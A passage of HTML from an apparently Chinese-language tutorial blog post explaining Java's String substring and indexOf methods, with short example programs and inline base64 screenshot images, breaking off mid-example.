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" alt="图片"></p>
-<p>这里把字符串里的每个字符进行排序编号，就会很容易理解</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String text = &quot;woshishuaige&quot;;</span><br><span class="line">		System.out.println(text.substring(0,2));</span><br><span class="line">		System.out.println(text.substring(2,5));</span><br><span class="line">		System.out.println(text.substring(5,10));</span><br><span class="line">		System.out.println(text.substring(10,12));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="data:image/png;base64,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" alt="图片"></p>
-<p>前面数字表示起始字符，后面表示结束字符</p>
-<p>方法indexof用于在字符串中查找字符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String name = &quot;zhang&quot;;</span><br><span class="line">		int index = name.indexOf(&#x27;a&#x27;);</span><br><span class="line">		System.out.println(index);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个例子确定了字符’a’在字符串的索引，会返回字符第一次出现的索引，如果需要返回后面多次出现位置的索引，就要其他参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String name = &quot;zhangzhangzhang&quot;;</span><br><span class="line">		int index = name.indexOf(&#x27;a&#x27;,3);</span><br><span class="line">		System.out.println(index);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>int index = name.indexOf(‘a’,3);从索引3（每个字符编号从0开始）开始查找下一个字符‘a’；<br>如果字符串中没有指定的字符，indexOf将返回-1；另外indexOf也可以用于查找子串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String name = &quot;yangwenhao&quot;;</span><br><span class="line">		int index = 